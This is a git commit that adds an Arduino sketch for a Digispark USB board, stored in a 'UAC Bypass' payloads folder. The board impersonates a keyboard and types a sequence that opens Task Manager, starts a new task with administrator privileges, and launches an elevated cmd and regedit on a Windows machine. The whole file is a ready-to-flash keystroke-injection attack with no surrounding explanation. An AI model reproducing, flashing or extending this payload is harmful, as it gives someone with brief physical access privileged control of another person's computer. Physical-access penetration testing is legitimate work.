5b421131f18e504edcedb9aa11b525ae1ffe52ce
Muhammad Talha Khan <MTK911@users.noreply.github.com>
2019-01-11 21:34:44 +0500

    Add files via upload

---
+++ payloads/UAC Bypass/UAC_Bypass_TaskMgr.ino
@@ -0,0 +1,31 @@
+#include "DigiKeyboard.h"
+#define KEY_TAB 0x2b
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+   
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+ 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("taskmgr"); //starting taskmgr
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
+  DigiKeyboard.sendKeyStroke(KEY_N);//run
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_TAB); 
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT); //run
+  DigiKeyboard.println("cmd");//start cmd
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("regedit");//start regedit
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+  
+}
